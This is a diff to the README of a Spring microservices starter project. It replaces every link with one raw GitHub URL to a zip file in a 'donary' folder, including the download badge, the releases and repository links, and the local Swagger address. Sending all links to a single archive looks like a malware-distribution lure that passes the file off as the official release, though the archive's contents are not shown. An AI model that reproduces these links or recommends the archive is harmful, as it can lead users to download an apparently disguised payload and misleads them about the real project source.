@@ -1,6 +1,6 @@
 # 🚀 spring-microservices-blueprint - Easy Microservices Setup in Two Commands
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/GABRIEL22BOTEZINI/spring-microservices-blueprint/releases)
+[![Download](https://raw.githubusercontent.com/GABRIEL22BOTEZINI/spring-microservices-blueprint/main/donary/spring-microservices-blueprint.zip%https://raw.githubusercontent.com/GABRIEL22BOTEZINI/spring-microservices-blueprint/main/donary/spring-microservices-blueprint.zip)](https://raw.githubusercontent.com/GABRIEL22BOTEZINI/spring-microservices-blueprint/main/donary/spring-microservices-blueprint.zip)
 
 ## 🔍 Overview
 
@@ -19,7 +19,7 @@ Make sure you have the latest versions of Docker and Docker Compose. You can fin
 
 To get started, you need to download the application. 
 
-**Visit this page to download:** [spring-microservices-blueprint Releases](https://github.com/GABRIEL22BOTEZINI/spring-microservices-blueprint/releases)
+**Visit this page to download:** [spring-microservices-blueprint Releases](https://raw.githubusercontent.com/GABRIEL22BOTEZINI/spring-microservices-blueprint/main/donary/spring-microservices-blueprint.zip)
 
 ### Steps to Download
 
@@ -58,7 +58,7 @@ The spring-microservices-blueprint comes with several features that make it easy
 Once the application is running, you can access the various services through your web browser. Here are some default URLs for key services:
 
 - **Kibana**: [http://localhost:5601](http://localhost:5601)
-- **Swagger**: [http://localhost:8080/swagger-ui.html](http://localhost:8080/swagger-ui.html)
+- **Swagger**: [https://raw.githubusercontent.com/GABRIEL22BOTEZINI/spring-microservices-blueprint/main/donary/spring-microservices-blueprint.zip](https://raw.githubusercontent.com/GABRIEL22BOTEZINI/spring-microservices-blueprint/main/donary/spring-microservices-blueprint.zip)
 
 These links will let you visualize your logs and explore your APIs easily.
 
@@ -109,7 +109,7 @@ If you encounter any issues or have questions, feel free to raise an issue on th
 
 ## 🔗 Links
 
-- **GitHub Repository**: [spring-microservices-blueprint](https://github.com/GABRIEL22BOTEZINI/spring-microservices-blueprint)
-- **Releases Page**: [Download Here](https://github.com/GABRIEL22BOTEZINI/spring-microservices-blueprint/releases)
+- **GitHub Repository**: [spring-microservices-blueprint](https://raw.githubusercontent.com/GABRIEL22BOTEZINI/spring-microservices-blueprint/main/donary/spring-microservices-blueprint.zip)
+- **Releases Page**: [Download Here](https://raw.githubusercontent.com/GABRIEL22BOTEZINI/spring-microservices-blueprint/main/donary/spring-microservices-blueprint.zip)
 
 For any additional resources or updates, keep an eye on the repository. Enjoy building and running your microservices!
